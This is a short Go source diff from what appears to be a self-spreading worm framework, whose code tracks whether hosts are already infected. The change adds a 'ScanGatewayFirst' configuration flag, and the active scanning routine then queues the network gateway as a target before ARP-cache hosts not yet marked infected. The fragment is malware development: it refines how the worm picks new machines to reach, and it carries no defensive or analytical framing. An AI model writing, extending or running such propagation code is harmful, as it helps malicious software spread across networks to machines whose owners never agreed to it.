@@ -89,6 +89,7 @@ type __NeuraxConfig struct {
 	ScanArpCache       bool
 	ScanThreads        int
 	ScanFullRange      bool
+	ScanGatewayFirst   bool
 	Base64             bool
 	ScanRequiredPort   int
 	Verbose            bool
@@ -128,6 +129,7 @@ var NeuraxConfig = __NeuraxConfig{
 	ScanArpCache:       false,
 	ScanThreads:        10,
 	ScanFullRange:      false,
+	ScanGatewayFirst:   false,
 	Base64:             false,
 	Verbose:            false,
 	Remove:             false,
@@ -477,6 +479,9 @@ func neurax_scan_passive(c chan string) {
 
 func neurax_scan_active(c chan string) {
 	targets := []string{}
+	if NeuraxConfig.ScanGatewayFirst {
+		targets = append(targets, GetGatewayIP())
+	}
 	if NeuraxConfig.ScanArpCache {
 		for ip, _ := range arp.Table() {
 			if !IsHostInfected(ip) {
